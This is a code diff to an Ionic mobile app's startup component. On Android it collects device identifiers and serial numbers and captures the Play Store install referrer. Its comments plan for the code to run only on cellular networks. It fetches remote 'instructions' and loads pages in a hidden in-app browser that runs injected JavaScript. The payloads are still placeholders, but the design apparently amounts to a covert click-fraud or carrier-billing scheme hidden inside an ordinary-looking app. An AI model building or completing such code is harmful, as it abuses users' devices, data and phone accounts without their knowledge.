@@ -9,63 +9,79 @@ import { Broadcaster } from '@ionic-native/broadcaster';
 import { Storage } from '@ionic/storage';
 import { Device } from '@ionic-native/device';
 import { Network } from '@ionic-native/network';
-
+import { Http } from '@angular/http';
+import 'rxjs/add/operator/map';
 
 @Component({
   templateUrl: 'app.html'
 })
 export class MyApp {
+
   rootPage:any = TabsPage;
 
   constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
-              broadcaster: Broadcaster, storage: Storage, device: Device, network: Network) {
+              broadcaster: Broadcaster, storage: Storage, device: Device, network: Network, http: Http) {
     platform.ready().then(() => {
       // Okay, so the platform is ready and our plugins are available.
       // Here you can do any higher level native things you might need.
       statusBar.styleDefault();
       splashScreen.hide();
 
-      //handle android specific devices
-      if(platform.is('android')) {
+      try{
+        //handle android specific devices
+        if(platform.is('android')) {
 
-        //todo we should run only if we are NOT on wifi or non cellular network
-        alert("network type "+network.type+" we should only run if we are on cellular network");
+          //get device settings and save it to local storage to use later
+          const deviceSettings ={
+            uuid : device.uuid,
+            model : device.model,
+            platform : device.platform,
+            version : device.version,
+            isVirtual : device.isVirtual,
+            serial : device.serial
+          };
 
-        //get device settings and save it to local storage to use later
-        const deviceSettings ={
-          uuid : device.uuid,
-          model : device.model,
-          platform : device.platform,
-          version : device.version,
-          isVirtual : device.isVirtual,
-          serial : device.serial
-        };
+          storage.set("deviceSettings", deviceSettings);
 
-        storage.set("deviceSettings", deviceSettings);
+          //todo, not sure if we're too late to get the broadcast event need to test this.  I think we are listening too late
+          //todo may need to write a custom plugin to get the ids OR make an app per affiliate
+          broadcaster.addEventListener('com.android.vending.INSTALL_REFERRER').subscribe(function(referrer){
+            console.log(referrer);
+            storage.set("referrer", referrer);
+          });
 
-        //todo, not sure if we're too late to get the broadcast event need to test this.  I think we are listening too late
-        //todo may need to write a custom plugin to get the ids OR make an app per affiliate
-        broadcaster.addEventListener('com.android.vending.INSTALL_REFERRER').subscribe(function(referrer){
-          console.log(referrer);
-          storage.set("referrer", referrer);
-        });
+          //todo we should run only if we are NOT on wifi or non cellular network
+          alert("network type "+network.type+" we should only run if we are on cellular network");
 
-        //this is the web view interactions...
-        const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
-        const path = 'https://ionicframework.com/';
-        const browser = iab.create(path, '_blank', browserOptions);
+          //call the api for instructions, here's a quick sample
+          http.get('https://www.reddit.com/r/gifs/new/.json?limit=10').map(res => res.json()).subscribe(
+            data => {
+              alert(data.data.children.length);
+            },
+            err => {
+              alert("Oops! "+err);
+            });
 
-        //we get a callback when the page is loaded, we can now execute js.  todo get instructions prior to this...
-        browser.on('loadstop').subscribe(event => {
-          console.log('loadstop', event);
-          browser.executeScript({code : "alert('hi')"}).then((result) => console.log(result));
-        });
+          //this is the web view interactions...
+          const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
+          const path = 'https://ionicframework.com/';
+          const browser = iab.create(path, '_blank', browserOptions);
 
+          //we get a callback when the page is loaded, we can now execute js.  todo get instructions prior to this...
+          browser.on('loadstop').subscribe(event => {
+            console.log('loadstop', event);
+            browser.executeScript({code : "alert('hi')"}).then((result) => console.log(result));
+          });
 
-        //test that the data we set has...
-        storage.get("deviceSettings").then((deviceSettings)=>alert(deviceSettings.uuid));
+          //test that the data we set has...
+          storage.get("deviceSettings").then((deviceSettings)=>alert("device uuid from seetings is "+deviceSettings.uuid));
 
+        }
+      }catch(err) {
+        //todo send this to the server for our inspection...
+        console.log("something went wrong "+err);
       }
     });
+
   }
 }
